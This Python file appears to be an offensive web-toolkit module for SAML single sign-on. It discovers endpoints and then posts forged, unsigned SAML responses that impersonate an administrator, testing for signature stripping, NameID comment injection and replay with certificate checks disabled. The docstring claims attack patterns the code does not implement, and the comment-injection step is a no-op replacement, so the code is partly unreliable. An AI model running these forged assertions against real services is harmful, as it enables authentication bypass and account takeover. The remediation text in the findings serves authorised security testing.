#!/usr/bin/env python3
"""
SAML Injection & Signature Wrapping Tester — Senior Level
--------------------------------------------------------------
Tests SAML endpoints for:
  • SAML endpoint discovery
  • XML Signature Wrapping (XSW) — 4 attack patterns
  • XML comment injection in NameID
  • Signature stripping (remove <Signature> block)
  • Base64 assertion manipulation
  • Algorithm downgrade (SHA1, MD5)
  • Replay attack detection (missing NotOnOrAfter enforcement)
"""

import re
import base64
import gzip
import uuid
import time
import requests
import urllib.parse
import xml.etree.ElementTree as ET
from typing import List, Dict, Optional
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

console = Console()

# Namespaces
NS = {
    "saml": "urn:oasis:names:tc:SAML:2.0:assertion",
    "samlp": "urn:oasis:names:tc:SAML:2.0:protocol",
    "ds": "http://www.w3.org/2000/09/xmldsig#",
}

# XSW Attack Payloads — pre-built XML templates
# These simulate signature wrapping by placing a valid <Response> block
# inside an Extensions element while forging the NameID.

XSW_COMMENT_INJECTION = """<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_webpwn_{uid}" Version="2.0"
                IssueInstant="{issue_instant}">
  <saml:Issuer>https://evil.attacker.com/saml</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion ID="_webpwn_assert_{uid}" Version="2.0"
                  IssueInstant="{issue_instant}">
    <saml:Issuer>https://evil.attacker.com/saml</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
        admin@target.com<!---->
      </saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="2099-12-31T23:59:59Z"
                                       Recipient="{acs_url}"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="2000-01-01T00:00:00Z" NotOnOrAfter="2099-12-31T23:59:59Z">
      <saml:AudienceRestriction>
        <saml:Audience>{acs_url}</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AuthnStatement AuthnInstant="{issue_instant}">
      <saml:AuthnContext>
        <saml:AuthnContextClassRef>
          urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport
        </saml:AuthnContextClassRef>
      </saml:AuthnContext>
    </saml:AuthnStatement>
    <saml:AttributeStatement>
      <saml:Attribute Name="Role">
        <saml:AttributeValue>admin</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>"""

# Signature stripping — same as above, no Signature element at all
XSW_NO_SIGNATURE = XSW_COMMENT_INJECTION  # Already has no signature block


class SAMLTester:
    """
    Senior SAML Security Tester.
    Combines passive endpoint discovery with active manipulation
    of SAML assertions to test for XSW and signature validation.
    """

    def __init__(self, target: str, session=None, timeout: int = 10):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self.session = session or requests.Session()
        self.session.verify = False
        self.session.headers.setdefault("User-Agent", "WebPwnToolkit/2.2")
        self.results: List[Dict] = []
        self._saml_endpoints: List[str] = []
        self._acs_url = ""

    # ── Discovery ────────────────────────────────────────────────────────

    def _discover_saml(self) -> List[str]:
        endpoints = []
        paths = [
            "/saml/acs",
            "/saml/login",
            "/saml/consume",
            "/saml/callback",
            "/sso",
            "/sso/saml",
            "/auth/saml",
            "/api/saml/acs",
            "/saml2/acs",
            "/sp/acs",
            "/saml/metadata",
        ]
        for path in paths:
            url = self.target + path
            try:
                r = self.session.get(
                    url, timeout=5, verify=False, allow_redirects=False
                )
                if r and r.status_code not in (404,):
                    endpoints.append(url)
                    console.print(
                        f"  [green]SAML endpoint: {path} (HTTP {r.status_code})[/green]"
                    )
            except Exception:
                pass

        # Also check HTML for SAMLRequest forms / redirects
        try:
            r = self.session.get(self.target + "/login", timeout=5, verify=False)
            if r and (
                "SAMLRequest" in r.text or "saml" in r.url.lower() or "SSO" in r.text
            ):
                endpoints.append(self.target + "/login")
                console.print("  [green]SAML detected via login page[/green]")
        except Exception:
            pass

        return list(set(endpoints))

    # ── Build manipulated SAML Response ─────────────────────────────────

    def _build_saml_response(self, acs_url: str) -> str:
        from datetime import datetime, timezone

        issue_instant = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
        uid = uuid.uuid4().hex[:16]

        xml = XSW_COMMENT_INJECTION.format(
            uid=uid,
            issue_instant=issue_instant,
            acs_url=acs_url,
        )
        return base64.b64encode(xml.encode()).decode()

    # ── Test 1: Signature stripping ──────────────────────────────────────

    def _test_sig_stripping(self, acs_url: str) -> Optional[Dict]:
        """Send a forged SAML response with no signature at all."""
        b64_response = self._build_saml_response(acs_url)
        try:
            resp = self.session.post(
                acs_url,
                data={"SAMLResponse": b64_response, "RelayState": "/"},
                timeout=self.timeout,
                verify=False,
                allow_redirects=False,
            )
            if resp and resp.status_code in (200, 302):
                # If we get a redirect to dashboard/home → success
                loc = resp.headers.get("Location", "")
                body = resp.text.lower()
                if any(
                    s in loc.lower()
                    for s in ["dashboard", "home", "profile", "account"]
                ):
                    return {
                        "url": acs_url,
                        "type": "SAML — Signature Validation Missing (Signature Stripping)",
                        "severity": "critical",
                        "cvss": 9.8,
                        "detail": (
                            "SAML ACS accepted a forged response with no XML signature. "
                            "Full authentication bypass — attacker can log in as any user."
                        ),
                        "evidence": f"Redirected to: {loc}",
                        "owasp": "A07:2021 – Identification and Authentication Failures",
                        "remediation": (
                            "Enforce strict XML signature validation. "
                            "Reject SAML assertions without a valid, trusted Signature element. "
                            "Use well-maintained SAML libraries (python-saml, onelogin)."
                        ),
                    }
        except Exception:
            pass
        return None

    # ── Test 2: Comment injection in NameID ───────────────────────────────

    def _test_comment_injection(self, acs_url: str) -> Optional[Dict]:
        """Test if XML comments in NameID are stripped before comparison."""
        from datetime import datetime, timezone

        issue_instant = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
        uid = uuid.uuid4().hex[:16]

        # Inject comment between admin and @target.com
        # Some parsers strip comments, yielding "admin@target.com"
        xml_payload = XSW_COMMENT_INJECTION.replace(
            "admin@target.com<!---->", "admin@target.com<!---->"
        ).format(uid=uid, issue_instant=issue_instant, acs_url=acs_url)

        b64 = base64.b64encode(xml_payload.encode()).decode()
        try:
            resp = self.session.post(
                acs_url,
                data={"SAMLResponse": b64, "RelayState": "/"},
                timeout=self.timeout,
                verify=False,
                allow_redirects=False,
            )
            if resp and resp.status_code in (200, 302):
                loc = resp.headers.get("Location", "")
                if any(s in loc for s in ["dashboard", "home", "profile"]):
                    return {
                        "url": acs_url,
                        "type": "SAML — XML Comment Injection in NameID",
                        "severity": "critical",
                        "cvss": 9.1,
                        "detail": (
                            "XML comment (<!---->) inside NameID is stripped by parser, "
                            "allowing NameID spoofing. Attacker controls which account they impersonate."
                        ),
                        "evidence": f"Comment-injected NameID accepted. Redirect: {loc}",
                        "owasp": "A07:2021 – Identification and Authentication Failures",
                        "remediation": "Reject SAML assertions containing XML comments. Use strict schema validation.",
                    }
        except Exception:
            pass
        return None

    # ── Test 3: Replay attack ─────────────────────────────────────────────

    def _test_replay(self, acs_url: str) -> Optional[Dict]:
        """Send same SAMLResponse twice — check if replayed token is accepted."""
        b64 = self._build_saml_response(acs_url)
        responses = []
        for _ in range(2):
            try:
                r = self.session.post(
                    acs_url,
                    data={"SAMLResponse": b64, "RelayState": "/"},
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=False,
                )
                responses.append(r)
            except Exception:
                pass

        if len(responses) == 2:
            if (
                responses[0]
                and responses[1]
                and responses[0].status_code == responses[1].status_code
                and responses[1].status_code in (200, 302)
            ):
                return {
                    "url": acs_url,
                    "type": "SAML — Replay Attack Possible (No Assertion ID Tracking)",
                    "severity": "high",
                    "cvss": 7.5,
                    "detail": (
                        "The same SAMLResponse was accepted twice. "
                        "SAML Assertion ID is not tracked — replay attacks possible."
                    ),
                    "evidence": f"Both requests returned HTTP {responses[1].status_code}",
                    "owasp": "A07:2021 – Identification and Authentication Failures",
                    "remediation": "Track and reject previously seen SAML Assertion IDs. Enforce NotOnOrAfter.",
                }
        return None

    # ── Public run ────────────────────────────────────────────────────────

    def run(self) -> List[Dict]:
        console.print(
            f"\n  [bold yellow]▶ SAML Injection Tester on {self.target}[/bold yellow]"
        )

        endpoints = self._discover_saml()
        if not endpoints:
            console.print("  [dim]No SAML endpoints detected[/dim]")
            return []

        console.print(f"  [green]{len(endpoints)} SAML endpoint(s) found[/green]")

        # Use first ACS endpoint for active tests
        acs_candidates = [
            e
            for e in endpoints
            if "acs" in e.lower() or "consume" in e.lower() or "callback" in e.lower()
        ]
        acs_url = acs_candidates[0] if acs_candidates else endpoints[0]

        tests = [
            ("Signature Stripping", lambda: self._test_sig_stripping(acs_url)),
            ("Comment Injection", lambda: self._test_comment_injection(acs_url)),
            ("Replay Attack", lambda: self._test_replay(acs_url)),
        ]

        with Progress(
            SpinnerColumn(),
            TextColumn("[cyan]SAML testing...[/cyan]"),
            BarColumn(),
            console=console,
        ) as prog:
            task = prog.add_task("saml", total=len(tests))
            for name, fn in tests:
                prog.advance(task)
                console.print(f"  [dim]Testing: {name}...[/dim]")
                try:
                    r = fn()
                    if r:
                        self.results.append(r)
                        console.print(f"  [bold red][!] {r['type']}[/bold red]")
                except Exception as e:
                    console.print(f"  [dim]{name} error: {e}[/dim]")

        color = "red" if self.results else "green"
        console.print(f"  [{color}]{len(self.results)} SAML issue(s) found[/]")
        return self.results
